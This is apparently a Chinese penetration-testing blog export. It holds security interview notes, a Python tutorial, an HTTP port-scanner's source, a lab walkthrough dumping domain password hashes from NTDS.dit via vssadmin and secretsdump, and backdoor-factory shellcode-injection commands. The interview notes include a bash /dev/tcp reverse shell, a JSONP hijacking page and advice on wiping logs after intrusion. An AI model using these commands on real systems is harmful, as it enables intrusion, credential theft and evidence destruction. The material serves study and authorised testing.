<h3 id="Jsonp安全攻防技术，怎么写Jsonp的攻击页面？"><a href="#Jsonp安全攻防技术，怎么写Jsonp的攻击页面？" class="headerlink" title=" Jsonp安全攻防技术，怎么写Jsonp的攻击页面？"></a><span id="head85"> Jsonp安全攻防技术，怎么写Jsonp的攻击页面？</span></h3><h4 id="涉及到Jsonp的安全攻防内容"><a href="#涉及到Jsonp的安全攻防内容" class="headerlink" title=" 涉及到Jsonp的安全攻防内容"></a><span id="head86"> 涉及到Jsonp的安全攻防内容</span></h4><p>JSON劫持、Callback可定义、JSONP内容可定义、Content-type不为json。</p>
<h4 id="攻击页面"><a href="#攻击页面" class="headerlink" title=" 攻击页面"></a><span id="head87"> 攻击页面</span></h4><p>JSON劫持，跨域劫持敏感信息，页面类似于</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function wooyun(v)&#123;</span><br><span class="line">alert(v.username);</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;http://js.login.360.cn/?o=sso&amp;m=info&amp;func=wooyun&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>Content-type不正确情况下，JSONP和Callback内容可定义可造成XSS。<br>JSONP和FLASH及其他的利用参照知道创宇的JSONP安全攻防技术。</p>
<h2 id="PHP"><a href="#PHP" class="headerlink" title=" PHP"></a><span id="head88"> PHP</span></h2><h3 id="php中命令执行涉及到的函数"><a href="#php中命令执行涉及到的函数" class="headerlink" title=" php中命令执行涉及到的函数"></a><span id="head89"> php中命令执行涉及到的函数</span></h3><p>1，代码执行：eval()、assert()、popen()、system()、exec()、shell_exec()、passthru(),pcntl_exec(),call_user_func_array(),create_function()<br>2，文件读取：file_get_contents(),highlight_file(),fopen(),read file(),fread(),fgetss(), fgets(),parse_ini_file(),show_source(),file()等<br>3，命令执行：system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open()</p>
<h3 id="安全模式下绕过php的disable-fuction"><a href="#安全模式下绕过php的disable-fuction" class="headerlink" title="安全模式下绕过php的disable fuction"></a><span id="head90">安全模式下绕过php的disable fuction</span></h3><p>DL函数，组件漏洞，环境变量。</p>
<h3 id="PHP弱类型"><a href="#PHP弱类型" class="headerlink" title=" PHP弱类型"></a><span id="head91"> PHP弱类型</span></h3><p><code>==</code> 在进行比较的时候，会先将字符串类型转化成相同，再比较</p>
<p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
<p><code>0e</code>开头的字符串等于0</p>
<h2 id="数据库"><a href="#数据库" class="headerlink" title=" 数据库"></a><span id="head92"> 数据库</span></h2><h3 id="各种数据库文件存放的位置"><a href="#各种数据库文件存放的位置" class="headerlink" title=" 各种数据库文件存放的位置"></a><span id="head93"> 各种数据库文件存放的位置</span></h3><p>mysql:<code>/usr/local/mysql/data/</code> <code>C:\ProgramData\MySQL\MySQL Server 5.6\Data\</code><br>oracle:<code>$ORACLE_BASE/oradata/$ORACLE_SID/</code></p>
<h2 id="系统"><a href="#系统" class="headerlink" title=" 系统"></a><span id="head94"> 系统</span></h2><h3 id="如何清理日志"><a href="#如何清理日志" class="headerlink" title=" 如何清理日志"></a><span id="head95"> 如何清理日志</span></h3><p>meterpreter: <code>clearev</code></p>
<h3 id="入侵-Linux-服务器后需要清除哪些日志？"><a href="#入侵-Linux-服务器后需要清除哪些日志？" class="headerlink" title="入侵 Linux 服务器后需要清除哪些日志？"></a><span id="head96">入侵 Linux 服务器后需要清除哪些日志？</span></h3><p>web日志，如apache的access.log,error.log。 直接将日志清除过于明显,一般使用sed进行定向清除</p>
<p>e.g. sed -i -e ‘/192.169.1.1/d’</p>
<p>history命令的清除，也是对~/.bash_history进行定向清除</p>
<p>wtmp日志的清除，/var/log/wtmp</p>
<p>登录日志清除 /var/log/secure</p>
<h3 id="LINUX"><a href="#LINUX" class="headerlink" title=" LINUX"></a><span id="head97"> LINUX</span></h3><h4 id="查看当前端口连接的命令有哪些？netstat-和-ss-命令的区别和优缺点"><a href="#查看当前端口连接的命令有哪些？netstat-和-ss-命令的区别和优缺点" class="headerlink" title="查看当前端口连接的命令有哪些？netstat 和 ss 命令的区别和优缺点"></a><span id="head98">查看当前端口连接的命令有哪些？<code>netstat</code> 和 <code>ss</code> 命令的区别和优缺点</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -antp` `ss -l</span><br></pre></td></tr></table></figure>

<p>ss的优势在于它能够显示更多更详细的有关TCP和连接状态的信息，而且比netstat更快速更高效。</p>
<h4 id="反弹-shell-的常用命令？一般常反弹哪一种-shell？为什么"><a href="#反弹-shell-的常用命令？一般常反弹哪一种-shell？为什么" class="headerlink" title="反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么?"></a><span id="head99">反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么?</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -i&gt;&amp;/dev/tcp/x.x.x.x/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<h4 id="通过Linux系统的-proc目录-，能够获取到哪些信息，这些信息可以在安全上有哪些应用？"><a href="#通过Linux系统的-proc目录-，能够获取到哪些信息，这些信息可以在安全上有哪些应用？" class="headerlink" title="通过Linux系统的/proc目录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应用？"></a><span id="head100">通过Linux系统的/proc目录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应用？</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls /proc</span><br></pre></td></tr></table></figure>

<p>系统信息，硬件信息，内核版本，加载的模块，进程</p>
<h4 id="linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。"><a href="#linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。" class="headerlink" title=" linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。"></a><span id="head101"> linux系统中，检测哪些配置文件的配置项，能够提升SSH的安全性。</span></h4><p><code>/etc/ssh/sshd___config</code><br>iptables配置</p>
<h4 id="如何一条命令查看文件内容最后一百行"><a href="#如何一条命令查看文件内容最后一百行" class="headerlink" title=" 如何一条命令查看文件内容最后一百行"></a><span id="head102"> 如何一条命令查看文件内容最后一百行</span></h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tail -n 100 filename</span><br></pre></td></tr></table></figure>

<h3 id="Windows"><a href="#Windows" class="headerlink" title=" Windows"></a><span id="head103"> Windows</span></h3><h4 id="如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。"><a href="#如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。" class="headerlink" title=" 如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。"></a><span id="head104"> 如何加固一个域环境下的Windows桌面工作环境？请给出你的思路。</span></h4><h2 id="密码学"><a href="#密码学" class="headerlink" title=" 密码学"></a><span id="head105"> 密码学</span></h2><h3 id="AES／DES的具体工作步骤"><a href="#AES／DES的具体工作步骤" class="headerlink" title=" AES／DES的具体工作步骤"></a><span id="head106"> AES／DES的具体工作步骤</span></h3><h3 id="RSA算法"><a href="#RSA算法" class="headerlink" title=" RSA算法"></a><span id="head107"> RSA算法</span></h3><p>加密:<br>$$<br>密文＝明文^EmodN<br>$$<br>RSA加密是对明文的E次方后除以N后求余数的过程</p>
<p>$$<br>公钥＝(E,N)<br>$$<br>解密:</p>
<p>$$<br>明文＝密文^DmodN<br>$$<br>$$<br>私钥＝(D,N)<br>$$<br>三个参数n,e1,e2</p>
<p>n是两个大质数p,q的积</p>
<h3 id="分组密码的加密模式"><a href="#分组密码的加密模式" class="headerlink" title=" 分组密码的加密模式"></a><span id="head108"> 分组密码的加密模式</span></h3><h3 id="如何生成一个安全的随机数？"><a href="#如何生成一个安全的随机数？" class="headerlink" title=" 如何生成一个安全的随机数？"></a><span id="head109"> 如何生成一个安全的随机数？</span></h3><p>引用之前一个学长的答案，可以通过一些物理系统生成随机数，如电压的波动、磁盘磁头读/写时的寻道时间、空中电磁波的噪声等。</p>
<h3 id="SSL握手过程"><a href="#SSL握手过程" class="headerlink" title=" SSL握手过程"></a><span id="head110"> SSL握手过程</span></h3><p>建立TCP连接、客户端发送SSL请求、服务端处理SSL请求、客户端发送公共密钥加密过的随机数据、服务端用私有密钥解密加密后的随机数据并协商暗号、服务端跟客户端利用暗号生成加密算法跟密钥key、之后正常通信。<br>这部分本来是忘了的，但是之前看SSL Pinning的时候好像记了张图在脑子里，挣扎半天还是没敢确定，遂放弃。。。</p>
<h3 id="对称加密与非对称加密的不同，分别用在哪些方面"><a href="#对称加密与非对称加密的不同，分别用在哪些方面" class="headerlink" title=" 对称加密与非对称加密的不同，分别用在哪些方面"></a><span id="head111"> 对称加密与非对称加密的不同，分别用在哪些方面</span></h3><h2 id="TCP-IP"><a href="#TCP-IP" class="headerlink" title=" TCP/IP"></a><span id="head112"> TCP/IP</span></h2><h3 id="TCP三次握手的过程以及对应的状态转换"><a href="#TCP三次握手的过程以及对应的状态转换" class="headerlink" title=" TCP三次握手的过程以及对应的状态转换"></a><span id="head113"> TCP三次握手的过程以及对应的状态转换</span></h3><p>（1）客户端向服务器端发送一个SYN包，包含客户端使用的端口号和初始序列号x;<br>（2）服务器端收到客户端发送来的SYN包后，向客户端发送一个SYN和ACK都置位的TCP报文，包含确认号xx1和服务器端的初始序列号y;<br>（3）客户端收到服务器端返回的SYNSACK报文后，向服务器端返回一个确认号为yy1、序号为xx1的ACK报文，一个标准的TCP连接完成。  </p>
<h3 id="TCP和UDP协议区别"><a href="#TCP和UDP协议区别" class="headerlink" title=" TCP和UDP协议区别"></a><span id="head114"> TCP和UDP协议区别</span></h3><p>tcp面向连接,udp面向报文<br>tcp对系统资源的要求多<br>udp结构简单<br>tcp保证数据完整性和顺序，udp不保证</p>
<h3 id="https的建立过程"><a href="#https的建立过程" class="headerlink" title=" https的建立过程"></a><span id="head115"> https的建立过程</span></h3><ul>
<li>客户端发送请求到服务器端</li>
<li>服务器端返回证书和公开密钥，公开密钥作为证书的一部分而存在</li>
<li>客户端验证证书和公开密钥的有效性，如果有效，则生成共享密钥并使用公开密钥加密发送到服务器端</li>
<li>服务器端使用私有密钥解密数据，并使用收到的共享密钥加密数据，发送到客户端</li>
<li>客户端使用共享密钥解密数据</li>
<li>SSL加密建立</li>
</ul>
<h2 id="流量分析"><a href="#流量分析" class="headerlink" title=" 流量分析"></a><span id="head116"> 流量分析</span></h2><h3 id="wireshark简单的过滤规则"><a href="#wireshark简单的过滤规则" class="headerlink" title=" wireshark简单的过滤规则"></a><span id="head117"> wireshark简单的过滤规则</span></h3><p><strong>过滤ip</strong>:</p>
<p>过滤源ip地址:<code>ip.src==1.1.1.1;</code>,目的ip地址:<code>ip.dst==1.1.1.1;</code></p>
<p><strong>过滤端口</strong>:</p>
<p>过滤80端口:<code>tcp.port==80</code>,源端口:<code>tcp.srcport==80</code>,目的端口:<code>tcp.dstport==80</code></p>
<p><strong>协议过滤</strong>:</p>
<p>直接输入协议名即可,如http协议<code>http</code></p>
<p><strong>http模式过滤</strong>:</p>
<p>过滤get/post包<code>http.request.mothod==&quot;GET/POST&quot;</code></p>
<h2 id="防火墙"><a href="#防火墙" class="headerlink" title=" 防火墙"></a><span id="head118"> 防火墙</span></h2><h3 id="简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。"><a href="#简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。" class="headerlink" title=" 简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。"></a><span id="head119"> 简述路由器交换机、防火墙等网络设备常用的几个基础配置加固项，以及配置方法。</span></h3><blockquote>
<p>转载请注明出处谢谢！</p>
</blockquote>
]]></content>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>如何理解python程序入口</title>
    <url>/2019/09/26/%E5%A6%82%E4%BD%95%E7%90%86%E8%A7%A3python%E7%A8%8B%E5%BA%8F%E5%85%A5%E5%8F%A3/</url>
    <content><![CDATA[<p>我经常在大佬的程序中看到这样的东西（if _ _ name _ _ == ‘_ _ main _ _’）<br>以前在学校的时候也只知道是个程序的入口，然后就只看下面的部分而已。只知道程序是从（if _ _ name _ _ == ‘ _ _ main _ _’）下面开始走的。<br>今天在看python 3.7的官方文档时，刚好看到这东西了，就顺便写一下自己的理解</p><a id="more"></a>
<p>在大佬们的程序中，我们一眼看去，程序是分为这么几个块的</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import ******       &lt;-------1、导入的某个模块</span><br><span class="line"></span><br><span class="line">def xxxx():         &lt;-------2、定义的某个函数</span><br><span class="line">    ******</span><br><span class="line">    ******</span><br><span class="line">    ******</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:          &lt;-------3、入口</span><br><span class="line"></span><br><span class="line">    ******       &lt;-------4、入口执行的代码</span><br><span class="line">    ******</span><br></pre></td></tr></table></figure>

<p>（至少我以前在学校里的时候看一个程序，都是这么看的。。。。。）</p>
<p>在这4个块中，以前在学校，我只看第4部分，也就是程序执行的代码。<br>工作之后，我看一眼第4部分，然后主要专研第2部分，这个定义的函数主要都做了什么。</p>
<p>第1部分很好理解，就是导入了某个程序需要用模块。</p>
<p>而这第3部分呢，事实上，它为程序定义了一个入口，按上面的代码举个栗子</p>
<h3 id="一：当我们直接运行这个程序的时候"><a href="#一：当我们直接运行这个程序的时候" class="headerlink" title="一：当我们直接运行这个程序的时候"></a>一：当我们直接运行这个程序的时候</h3><p>当我们直接运行这个程序的时候，程序是这么走的。</p>
<ol>
<li>先从入口（3），开始往下走。</li>
<li>走到代码执行部分（4）</li>
<li>当执行的代码需要用到自己定义的函数的时候，代码就直接跳到定义的函数部分（2）</li>
</ol>
<p>上面应该能理解吧？这就是python逐步执行程序的步骤。（不谈导入模块部分，类似于上述第3步）</p>
<hr>
<p>但是呢，有时候我们写了另外一个程序B(假设上面一开始的是程序A),而程序B的某一部分代码需要用到程序A中已经定义好的函数，那么这时候怎么搞？</p>
<p>把程序A中的函数定义的代码复制粘贴过去？</p>
<p>也不是不可以，但是如果你要开发一个系统呢，上万行的代码，都粘贴到一个文件中？</p>
<p>这时候，我们可以使用导入模块的方式来导入需要的函数！</p>
<h3 id="二：当我们把这个程序当做模块导入另一个程序的时候"><a href="#二：当我们把这个程序当做模块导入另一个程序的时候" class="headerlink" title="二：当我们把这个程序当做模块导入另一个程序的时候"></a>二：当我们把这个程序当做模块导入另一个程序的时候</h3><p>这时候我们就需要if <strong>name</strong> == ‘<strong>main</strong>‘:来帮助我们了。<br>当这个程序A被当做模块导入另一个程序的时候，我们只需要其中1、2部分，而不需要第4部分。</p>
<p>所以在程序中，import程序A后，当程序B的代码需要用到程序A中定义好的函数的时候，它会自己去取函数部分，而不会使整个程序A执行。</p>
<p>大致步骤如下：</p>
<p>1、从程序B入口开始往下，走到代码执行部分</p>
<p>2、当执行的代码需要用到程序A中的函数时，去取出程序A函数代码（不取出第3、4部分代码），再执行</p>
<p>像if _ _ name _ _ == ‘ _ _main _ _’:这样的方式写程序，当以后我们另一个程序需要用到这个程序的时候，就直接导入这个程序就好了，省去了重写函数和复制粘贴的时候。</p>
<p>我觉得我越说越乱，上结论：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">当xx.py文件被直接运行时，if __name__ == &apos;__main__&apos;之下的代码块将被运行；</span><br><span class="line">当xx.py文件以模块形式被导入时，if __name__ == &apos;__main__&apos;之下的代码块不被运行。</span><br></pre></td></tr></table></figure>







]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>HttpScan（龟速HTTP服务发现程序）</title>
    <url>/2019/09/25/HttpScan%EF%BC%88%E9%BE%9F%E9%80%9FHTTP%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0%E7%A8%8B%E5%BA%8F%EF%BC%89/</url>
    <content><![CDATA[<p>2019年9月份写的，当时是因为一个项目用nmap扫端口的时候没有发现开放9090的http服务端口，项目结束提交出去后，另一家乙方在9090上发现了严重漏洞，导致我们很尴尬，然后我就含着愧疚写下了这个垃圾扫描器。在网盘吃灰好久了，今天翻到就想着发出来，算是一段屈辱史吧。</p><a id="more"></a>
<p>垃圾程序，大佬莫喷</p>
<p>线程默认是1000，-t可指定线程，结果会保存在result.txt里</p>
<p>详细可见GayHub：<a href="https://github.com/L10nK1n6/HttpScan" target="_blank" rel="noopener">https://github.com/L10nK1n6/HttpScan</a></p>
<p>源代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">from queue import Queue</span><br><span class="line">import threading</span><br><span class="line">from user_agent import user_agent_list</span><br><span class="line">from optparse import OptionParser</span><br><span class="line"> </span><br><span class="line">class HttpScanMain:</span><br><span class="line">	def __init__(self, options):</span><br><span class="line">		self.url = options.url</span><br><span class="line">		self.count = options.count</span><br><span class="line">		</span><br><span class="line">	class HttpScan(threading.Thread):</span><br><span class="line">		def __init__(self, queue,total):</span><br><span class="line">			threading.Thread.__init__(self)</span><br><span class="line">			self._queue = queue</span><br><span class="line">			self._total = total</span><br><span class="line">				</span><br><span class="line">		def run(self):</span><br><span class="line">			while not self._queue.empty():</span><br><span class="line">				url = self._queue.get()</span><br><span class="line"></span><br><span class="line">				threading.Thread(target=self.msg).start()</span><br><span class="line"> </span><br><span class="line">				try:</span><br><span class="line">					r = requests.get(url=url, headers=user_agent_list.get_user_agent(), timeout=8,)</span><br><span class="line">					if r.status_code == 200 or r.status_code == 302:</span><br><span class="line">						sys.stdout.write(&apos;\r&apos; + &apos;[+]%s\t\t\n&apos; % (url))</span><br><span class="line">						result = open(&apos;result.txt&apos;,&apos;a+&apos;)</span><br><span class="line">						result.write(url)</span><br><span class="line">						result.write(&apos;\r\n&apos;)</span><br><span class="line">						result.close()</span><br><span class="line">				except Exception as e:</span><br><span class="line">					pass</span><br><span class="line"> </span><br><span class="line">		def msg(self):</span><br><span class="line">			per = 100 - float(self._queue.qsize())/float(self._total) * 100</span><br><span class="line">			percentage = &quot;%s Finished| %s All| Scan in %1.f %s&quot;%((self._total - self._queue.qsize()),self._total,per,&apos;%&apos;)</span><br><span class="line">			sys.stdout.write(&apos;\r&apos;+&apos;[*]&apos;+percentage)</span><br><span class="line"> </span><br><span class="line">	def start(self):</span><br><span class="line">		result = open(&apos;result.txt&apos;,&apos;w&apos;)</span><br><span class="line">		result.close()</span><br><span class="line"> </span><br><span class="line">		queue = Queue()</span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">		for i in range(1, 65536):</span><br><span class="line">			queue.put(self.url+&quot;:&quot;+str(i).rstrip())</span><br><span class="line"></span><br><span class="line">		total = queue.qsize()</span><br><span class="line"> </span><br><span class="line">		threads = []</span><br><span class="line">		thread_count = int(self.count)</span><br><span class="line"> </span><br><span class="line">		for i in range(thread_count):</span><br><span class="line">			threads.append(self.HttpScan(queue,total))</span><br><span class="line">		for i in threads:</span><br><span class="line">			i.start()</span><br><span class="line">		for i in threads:</span><br><span class="line">			i.join()</span><br><span class="line"> </span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line"> </span><br><span class="line">	print (&apos;&apos;&apos;</span><br><span class="line"> _   _ _   _         _____                 </span><br><span class="line">| | | | | | |       /  ___|                </span><br><span class="line">| |_| | |_| |_ _ __ \ `--.  ___ __ _ _ __  </span><br><span class="line">|  _  | __| __| &apos;_ \ `--. \/ __/ _` | &apos;_ \ </span><br><span class="line">| | | | |_| |_| |_) /\__/ / (_| (_| | | | |</span><br><span class="line">\_| |_/\__|\__| .__/\____/ \___\__,_|_| |_|</span><br><span class="line">              | |                          </span><br><span class="line">              |_|                         </span><br><span class="line">                                                                                                             </span><br><span class="line">	&apos;&apos;&apos;)</span><br><span class="line"> </span><br><span class="line">	parser = OptionParser(&apos;./web_dir_scan.py -u &lt;Target URL&gt; [-t &lt;Thread_count&gt;]&apos;)</span><br><span class="line">	parser.add_option(&apos;-u&apos;,&apos;--url&apos;,dest=&apos;url&apos;,type=&apos;string&apos;,help=&apos;target url for scan&apos;)</span><br><span class="line">	parser.add_option(&apos;-t&apos;,&apos;--thread&apos;,dest=&apos;count&apos;,type=&apos;int&apos;,default=1000,help=&apos;scan thread_count,default=1000&apos;)</span><br><span class="line">	(options,args)=parser.parse_args()</span><br><span class="line"> </span><br><span class="line">	if options.url :</span><br><span class="line">		HttpScan = HttpScanMain(options)</span><br><span class="line">		HttpScan.start()</span><br><span class="line">		sys.exit(1)</span><br><span class="line">	else:</span><br><span class="line">		parser.print_help()</span><br><span class="line">		sys.exit(1)</span><br></pre></td></tr></table></figure>

<p>其实就是把端口往URL上怼，碰对了就返回结果，虽然慢一点，但是比nmap扫漏了要好</p>
]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>VSS获取NTDS.dit的方法</title>
    <url>/2019/09/19/VSS%E8%8E%B7%E5%8F%96NTDS.dit%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<blockquote>
<p>本文是看Uknow大佬的文章，选其中一部分copy出来的。<br>原文链接：<a href="https://uknowsec.cn/posts/notes/域渗透-获取NTDS.dit.html" target="_blank" rel="noopener">https://uknowsec.cn/posts/notes/域渗透-获取NTDS.dit.html</a></p>
</blockquote><a id="more"></a>
<h2 id="Ntds-dit介绍"><a href="#Ntds-dit介绍" class="headerlink" title="Ntds.dit介绍"></a>Ntds.dit介绍</h2><p>Ntds.dit是主要的AD数据库，包括有关域用户，组和组成员身份的信息。它还包括域中所有用户的密码哈希值。为了进一步保护密码哈希值，使用存储在SYSTEM注册表配置单元中的密钥对这些哈希值进行加密。</p>
<h2 id="vssadmin获取Ntds"><a href="#vssadmin获取Ntds" class="headerlink" title="vssadmin获取Ntds"></a>vssadmin获取Ntds</h2><p>vssadmin域环境默认安装</p>
<p>支持系统：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Server 2008</span><br><span class="line">Server 2012</span><br></pre></td></tr></table></figure>
<h2 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h2><h3 id="1、查询当前系统的快照"><a href="#1、查询当前系统的快照" class="headerlink" title="1、查询当前系统的快照"></a>1、查询当前系统的快照</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vssadmin list shadows</span><br></pre></td></tr></table></figure>
<h3 id="2、创建快照（在C盘）"><a href="#2、创建快照（在C盘）" class="headerlink" title="2、创建快照（在C盘）"></a>2、创建快照（在C盘）</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vssadmin create shadow /for=c:</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/11/11/Lcd8x7ghFBVDqj1.png" alt="1567068293370.png"></p>
<p>获得Shadow Copy Volume Name为\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2</p>
<h3 id="3、复制ntds-dit"><a href="#3、复制ntds-dit" class="headerlink" title="3、复制ntds.dit"></a>3、复制ntds.dit</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit c:\ntds.dit</span><br></pre></td></tr></table></figure>
<h3 id="4、删除快照"><a href="#4、删除快照" class="headerlink" title="4、删除快照"></a>4、删除快照</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vssadmin delete shadows /for=c: /quiet</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/11/11/IUptaXyk4RPuoE5.png" alt="1567068417353.png"></p>
<p>完了就直接把c:\ntds.dit复制出来解密就好</p>
]]></content>
      <tags>
        <tag>记录</tag>
      </tags>
  </entry>
  <entry>
    <title>vssadmin获取NTDS实操</title>
    <url>/2019/09/19/vssadmin%E8%8E%B7%E5%8F%96NTDS%E5%AE%9E%E6%93%8D/</url>
    <content><![CDATA[<p>把昨天发的vssadmin获取ntds数据库的文章实际操作了一下<br>这里使用的是God.org单域环境(更新1)，我的目的只是实操vssadmin所以不搞的太复杂<br><img src="https://i.loli.net/2019/11/11/gKbpe8clSqTjYZ9.png" alt="Image-1.png"></p><a id="more"></a>
<p>下载、解压、打开虚拟机（开机密码在描述里）</p>
<p>打开终端执行命令看一下list</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vssadmin list shadows</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/11/11/orH5BgVIn41Lhx9.png" alt="Image-2.png"></p>
<p>然后创建一个快照</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vssadmin create shadow /for=c:</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/11/11/2V4taj6NhQWf3zR.png" alt="Image-3.png"></p>
<p>将NTDS和system文件复制出来</p>
<p>我这里也将sam也一起复制出来，方便后续顺便对比一下sam中的hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\windows\NTDS\ntds.dit c:\ntds.dit</span><br><span class="line"></span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SYSTEM c:\system.hiv</span><br><span class="line"></span><br><span class="line">copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\System32\config\SAM c:\sam.hiv</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/11/11/QnSchHo8I6zvXtO.png" alt="Image-4.png"></p>
<p>可以看到C盘下已经有我复制出来的3个文件了</p>
<p><img src="https://i.loli.net/2019/11/11/XJdVEkwzNe1IpHm.png" alt="Image-5.png"></p>
<p>记得把快照删掉</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vssadmin delete shadows /for=c: /quiet</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/11/11/qDXi7K31pjtTbJo.png" alt="Image-6.png"></p>
<p>将3个文件复制到本地</p>
<p>然后从<a href="https://github.com/SecureAuthCorp/impacket" target="_blank" rel="noopener">https://github.com/SecureAuthCorp/impacket</a> 把项目下载下来，我们只需要其中的\impacket-master\examples\secretsdump.py文件，将其与其它3个文件放一起方便操作。</p>
<p><img src="https://i.loli.net/2019/11/11/osA6LOi7TdaqtjH.png" alt="Image-7.png"></p>
<p>然后终端打开到这个目录，然后输入以下命令解码</p>
<p>ps:如果出现：ImportError: No module named impacket报错，那就pip install impacket就好</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">py -2 secretsdump.py -system system.hiv -ntds ntds.dit local</span><br></pre></td></tr></table></figure>

<p>ps:我这里是本地装了多个python版本，所以是py -2。<br>等待一下之后会出现解出来的信息</p>
<p><img src="https://i.loli.net/2019/11/11/9levr2DEa4nOTGi.png" alt="Image-9.png"></p>
<p>我们把hash拿去cmd5解一下，解出来可以看到密码</p>
<p><img src="https://i.loli.net/2019/11/11/QyTLFfAg8l2a3t4.png" alt="Image-10-1.png"></p>
<p>我们再来试试解sam，将下面3个文件放一起，方便操作</p>
<p><img src="https://i.loli.net/2019/11/11/JtOpPBoRAsh2wZq.png" alt="Image-11.png"></p>
<p>输入以下命令，但是啥都没解出来，这里先占个坑，日后研究研究与dump lsass内存的方式获取本地密码有何不同。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsadump::sam /system:system.hiv /sam:sam.hiv</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2019/11/11/GQYr3fTLd7E4UgD.png" alt="image-1568973604412.png"></p>
]]></content>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>shellcode注入工具—backdoor-factory</title>
    <url>/2019/09/19/shellcode%E6%B3%A8%E5%85%A5%E5%B7%A5%E5%85%B7%E2%80%94backdoor-factory/</url>
    <content><![CDATA[<p>backdoor-factory是向正常的elf、exe、dll注入shellcode。之前测试过，免杀效果还可以，但是比较依赖正常的文件</p><a id="more"></a>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">backdoor.py -f /demo/xxx.exe -S   //检测是否支持后门植入</span><br><span class="line">backdoor.py -f /demo/xxx.exe -c -l 700    //显示出code cave大于700字符大小的code cave</span><br><span class="line">backdoor.py -f /demo/xxx.exe -s show  //查看可用payload</span><br><span class="line">backdoor.py -f /demo/xxx.exe -H x.x.x.x -P 8080 -s iat_reverse_tcp_stager_threaded     //插入payload，并生成文件。</span><br></pre></td></tr></table></figure>

<p>生成好之后可以对比一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">md5sum ./guobang.exe /root/demo/guobang.exe  //对比原文件与生成文件MD5值</span><br><span class="line">du -b ./guobang.exe /root/demo/guobang.exe   //对比文件大小</span><br></pre></td></tr></table></figure>

<p>tips:<br>1、backdoor最好是github上下载的，不要aptget</p>
]]></content>
      <tags>
        <tag>工具</tag>
      </tags>
  </entry>
  <entry>
    <title>PC客户端（C-S架构）渗透测试CheckList</title>
    <url>/2019/09/17/PC%E5%AE%A2%E6%88%B7%E7%AB%AF%EF%BC%88C-S%E6%9E%B6%E6%9E%84%EF%BC%89%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95CheckList/</url>
    <content><![CDATA[<p>分享一个PC客户端渗透测试的checklist，稍微看了一下，方法和思路比我自己做项目时要清晰很多。</p><a id="more"></a>
<p>我自己在做这类cs架构的客户端测试时，一般都是用Fiddler+Proxifer的方式进行代理抓包，代理弄好之后就当成web系统渗透测试。</p>
<p>而作者的项目里还包括了像逆向这种，一般来说，客户给的测试系统都不会加壳，至少我目前接触到的都未加壳。</p>
